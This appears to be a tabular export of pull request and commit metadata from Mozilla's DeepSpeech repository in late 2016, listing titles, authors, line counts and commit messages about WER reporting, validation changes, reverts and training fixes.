4194,https://api.github.com/repos/mozilla/DeepSpeech/pulls/242,242,Fixed #241,,kdavis-mozilla,12054740,2016-11-28T08:01:26Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,994fc962ceaf2b4783784aeb32641aeb510fcc73,Fixed #241
4195,https://api.github.com/repos/mozilla/DeepSpeech/pulls/240,240,Fixed #236,Quick fix,kdavis-mozilla,12054740,2016-11-28T06:59:28Z,CONTRIBUTOR,True,32,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29ec75a58cd0f6e2953b1d1584bfe2febae8976f,Fixed #236
4196,https://api.github.com/repos/mozilla/DeepSpeech/pulls/240,240,Fixed #236,Quick fix,kdavis-mozilla,12054740,2016-11-28T06:59:28Z,CONTRIBUTOR,True,32,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,605b036b67a66ebfa66bb8d752b74b8a6fc261de,Address review comments
4197,https://api.github.com/repos/mozilla/DeepSpeech/pulls/237,237,Hack to address issue #234 for long weekend run,,kdavis-mozilla,12054740,2016-11-26T07:21:59Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,002f0dd505f197f5e5ae44c3c44066165c18cc1d,Made the system not validate during wer-tracking
4198,https://api.github.com/repos/mozilla/DeepSpeech/pulls/237,237,Hack to address issue #234 for long weekend run,,kdavis-mozilla,12054740,2016-11-26T07:21:59Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,095d18ea1120459a765a77123c91d87a9b2f85bf,May the system not validate on the final epoch
4199,https://api.github.com/repos/mozilla/DeepSpeech/pulls/237,237,Hack to address issue #234 for long weekend run,,kdavis-mozilla,12054740,2016-11-26T07:21:59Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fa6a22de74a8711b17f4876ae12086ed8bbd0b9,checkpoint_path is required for final epoch
4200,https://api.github.com/repos/mozilla/DeepSpeech/pulls/237,237,Hack to address issue #234 for long weekend run,,kdavis-mozilla,12054740,2016-11-26T07:21:59Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a129b29a2bc8f4be209eed9c5b38e6e7fed9e25,Never produce validation report for fear of OOM
4201,https://api.github.com/repos/mozilla/DeepSpeech/pulls/237,237,Hack to address issue #234 for long weekend run,,kdavis-mozilla,12054740,2016-11-26T07:21:59Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c89063796c0077bd01d075d67230bbc64ed06f2,"Merge pull request #235 from mozilla/issue234

Issue234"
4202,https://api.github.com/repos/mozilla/DeepSpeech/pulls/235,235,Issue234,"Hack to hopefully stop issue #234 

Simply do not print WER on validation and only validate on last epoch. A real solution likely neeeds to be found.",kdavis-mozilla,12054740,2016-11-26T07:13:11Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,002f0dd505f197f5e5ae44c3c44066165c18cc1d,Made the system not validate during wer-tracking
4203,https://api.github.com/repos/mozilla/DeepSpeech/pulls/235,235,Issue234,"Hack to hopefully stop issue #234 

Simply do not print WER on validation and only validate on last epoch. A real solution likely neeeds to be found.",kdavis-mozilla,12054740,2016-11-26T07:13:11Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,095d18ea1120459a765a77123c91d87a9b2f85bf,May the system not validate on the final epoch
4204,https://api.github.com/repos/mozilla/DeepSpeech/pulls/235,235,Issue234,"Hack to hopefully stop issue #234 

Simply do not print WER on validation and only validate on last epoch. A real solution likely neeeds to be found.",kdavis-mozilla,12054740,2016-11-26T07:13:11Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fa6a22de74a8711b17f4876ae12086ed8bbd0b9,checkpoint_path is required for final epoch
4205,https://api.github.com/repos/mozilla/DeepSpeech/pulls/235,235,Issue234,"Hack to hopefully stop issue #234 

Simply do not print WER on validation and only validate on last epoch. A real solution likely neeeds to be found.",kdavis-mozilla,12054740,2016-11-26T07:13:11Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a129b29a2bc8f4be209eed9c5b38e6e7fed9e25,Never produce validation report for fear of OOM
4206,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,551a4b116ec23daa23d8422ff17b13976c3ebe06,Fix #188; Using distances to filter WERs
4207,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,621c854a28ce8e30c6a7b2769ffd8eb9036b3697,Fixed some markdown
4208,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73948a39020687c1b6d251adb1d9397fcfeefe22,Fixing rebased code
4209,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e42c541d784de5cced485626a8c12ccbfcb1c2f9,Removed redundant code
4210,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfa2dca70b1cbc3f974f7f9b24ebf64fa6ef68f2,Better markdown based on PR comments
4211,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,817e65c173e47815f4b1a4e3c980cf15f51718f7,Fixed some markdown
4212,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0724db7808bdc6511fbadc326bb108dd30d5239f,"Merge pull request #208 from mozilla/issue188

Fix #188; Using distances to filter WERs"
4213,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e83b49ee3e0a712e8f9f957677e24d913b9f96d1,"Fix #176; Training, validation an test each in separate sessions and own graphs"
4214,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee2583339910ad4ddd5e8e8d8daac89262167969,Addressed review comments
4215,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,967b949f8cba2e7b62b7544ea40bcfe851833fae,"Merge pull request #227 from mozilla/issue176

Fix #176: Training, validation an test each in separate sessions and own graphs"
4216,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79b41afa49f8888ca4b21d045dc4898f293208cf,Fixed #229
4217,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03d94c95751807ab229aa75e43286b80717c2170,"Merge pull request #232 from mozilla/issue229

Fixed #229"
4218,https://api.github.com/repos/mozilla/DeepSpeech/pulls/233,233,Wer update,,lissyx,1645737,2016-11-25T19:48:13Z,COLLABORATOR,True,531,333,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b90844f95af659b1ba7620ca80d7977913f463c,Merge remote-tracking branch 'upstream/master' into wer-update
4219,https://api.github.com/repos/mozilla/DeepSpeech/pulls/232,232,Fixed #229,,kdavis-mozilla,12054740,2016-11-25T19:32:39Z,CONTRIBUTOR,True,12,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79b41afa49f8888ca4b21d045dc4898f293208cf,Fixed #229
4220,https://api.github.com/repos/mozilla/DeepSpeech/pulls/230,230,Allow limiting epoch size,Limiting the epoch size allows for more incremental progress reporting.,Cwiiis,668518,2016-11-25T16:19:39Z,CONTRIBUTOR,False,61,51,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ef30c785c33fbcf85065d1b325b11cac6b392f29,"Allow limiting epoch size

Limiting the epoch size allows for more incremental progress reporting."
4221,https://api.github.com/repos/mozilla/DeepSpeech/pulls/227,227,"Fix #176: Training, validation an test each in separate sessions and own graphs ",,tilmankamp,5991088,2016-11-24T16:19:18Z,CONTRIBUTOR,True,481,270,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e83b49ee3e0a712e8f9f957677e24d913b9f96d1,"Fix #176; Training, validation an test each in separate sessions and own graphs"
4222,https://api.github.com/repos/mozilla/DeepSpeech/pulls/227,227,"Fix #176: Training, validation an test each in separate sessions and own graphs ",,tilmankamp,5991088,2016-11-24T16:19:18Z,CONTRIBUTOR,True,481,270,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee2583339910ad4ddd5e8e8d8daac89262167969,Addressed review comments
4223,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd2df3dbcc7d41ea50f152cff381245c5a519320,Fix #205; Better epoch console logging
4224,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e2f5036994d1cdccc746e7bc61da23bcdff8e8b,Updates based on PR comments
4225,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae0c5f44aa11cae51ca8774f634c696ec43721f7,"Merge pull request #211 from mozilla/issue205

Fix #205; Better epoch console logging"
4226,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d8a261a1d2aa81b7e8004646cc7adc2fe3d5092,"Revert ""Merge pull request #192 from Cwiiis/validation-graph-duplication-rebased""

This reverts commit 08064e71203c259f0f7f26bbd236d8f7fd746ab1, reversing
changes made to 757fc74e1ee5795daee62565d677236d425995ed."
4227,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9325b03aa845604eee993f269a82898d8a047156,Fix #219; Fixed wrong duration formatting
4228,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfc36caa6f961ab73f641b6ceedadcc66012fcd2,"Merge pull request #218 from mozilla/issue216

Revert ""Merge pull request #192 from Cwiiis/validation-graph-duplicat…"
4229,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06c063e9bc85cb289623d21a25ac362d49196365,"Merge pull request #220 from mozilla/issue219

Fix #219; Fixed wrong duration formatting"
4230,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2af3bc68f26c3a99e16ca3146fcb0a9290aa1651,Fix #221
4231,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c966681d84f66e7dd959a73be69c21741009fa2,"Merge pull request #222 from mozilla/issue221

Fix #221"
4232,https://api.github.com/repos/mozilla/DeepSpeech/pulls/223,223,Wer update,,lissyx,1645737,2016-11-18T17:32:15Z,COLLABORATOR,True,155,63,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0662ceb038fcda45fdb363d9fa5a201b7e8c07e6,Merge remote-tracking branch 'upstream/master' into wer-update
4233,https://api.github.com/repos/mozilla/DeepSpeech/pulls/222,222,Fix #221,,kdavis-mozilla,12054740,2016-11-18T16:33:40Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2af3bc68f26c3a99e16ca3146fcb0a9290aa1651,Fix #221
4234,https://api.github.com/repos/mozilla/DeepSpeech/pulls/220,220,Fix #219; Fixed wrong duration formatting,@Cwiiis Please review.,tilmankamp,5991088,2016-11-18T14:58:04Z,CONTRIBUTOR,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9325b03aa845604eee993f269a82898d8a047156,Fix #219; Fixed wrong duration formatting
4235,https://api.github.com/repos/mozilla/DeepSpeech/pulls/218,218,"Revert ""Merge pull request #192 from Cwiiis/validation-graph-duplicat…","…ion-rebased""

This reverts commit 08064e71203c259f0f7f26bbd236d8f7fd746ab1, reversing
changes made to 757fc74e1ee5795daee62565d677236d425995ed.",kdavis-mozilla,12054740,2016-11-18T14:26:58Z,CONTRIBUTOR,True,75,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d8a261a1d2aa81b7e8004646cc7adc2fe3d5092,"Revert ""Merge pull request #192 from Cwiiis/validation-graph-duplication-rebased""

This reverts commit 08064e71203c259f0f7f26bbd236d8f7fd746ab1, reversing
changes made to 757fc74e1ee5795daee62565d677236d425995ed."
4236,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a871a8c2d812c5e4fee8ee41a2b0caf8e6b0a940,Optionally remove old model exports
4237,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,181cae7d89dc14d71b362ef5d337a79ea2b4f5f3,Fixed #163
4238,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d57ada4e094bba953f31c9093a9a2843259d8476,Don't merge repeated characters in ctc_beam_search_decoder
4239,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc1919ec50bdf31b4411e4085858702222945901,"Do not remove existing checkpoint dirs, update training paramteters

This breaks restore feature. We should let code overwrite existing
checkpoints. This fixes #166.

Change training parameters, to address issue #169."
4240,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84a224744651ebcbc3b5b37fbde6cbe1ecd5cd7c,Fixed #164
4241,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a51bf7dc8db020dc83734139c5ee84f3cc8d2e7,Modified to have a uniform importer API
4242,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,99ec369fb90d2fc805360aa1663d84e6cc93fb56,Fixed #172
4243,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0da42fbf17b8e858af33682437c83c5e309c2a53,Fixed #174
4244,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,563ef4dc0b64426ee866858dc17cfe27c036ebe2,Fixed typo
4245,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ca83ec6d081f007313faf3c652514d12b50a1502,Made dirs server centric
4246,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a78b4a671d5547d7a0a92697ec5281597c56fce,Export the model on automation
4247,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e10208fc9f55d29a59266e79e518548f47f8e37b,Fixed #181 Fixed #182
4248,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1735996d2e1a5b3dc1cf952cf2a6d03a93d26089,Fix #134; better axis description and value plotting in WER report page
4249,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12ddc071d77ba1ab9f49412d25964bbef96236ef,Better formatting for Y axis.
4250,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2ec8ee9ddd3da5d448e010ac8f317467572889a0,Fix #132 #126 - Inlined WER report inference into train loop
4251,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d05f24e17cf758175209a74b967b2d9faa33446,Better code reuse; minor improvements
4252,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94652da4f88c429be683964e2e2f79e5d3410d45,Updated some markdown
4253,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c79dbc932d80b32e0d3af769de2c93ed10b6253,Fixed some markdown
4254,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96584e554ff2f96d146ad13b3e37851cf429d3e1,Fixed PR comments
4255,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e67df255be61fb8ff1bb7df7ac8eb07323da036,Fix #195; Calling SummaryWriter after all graph components got created
4256,https://api.github.com/repos/mozilla/DeepSpeech/pulls/217,217,Fix #216 ,"Reverts commit 08064e7 and deals with all the associated merge conflicts.

@tilmankamp I did not deal with the last commit you made a min or two ago. So, there's likely more merge conflicts to deal with.",kdavis-mozilla,12054740,2016-11-18T11:24:50Z,CONTRIBUTOR,False,540,208,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9bbe4c125b2620da39b1795334b4613ec009d9ac,"Fixed #193

Moved graph creationg to before the lines

    # Start queue runner threads
    tf.train.start_queue_runners(sess=session)

    # Start importer's queue threads
    data_sets.start_queue_threads(session)

so as to not have the queue threads operate on a graph that is being
modified."
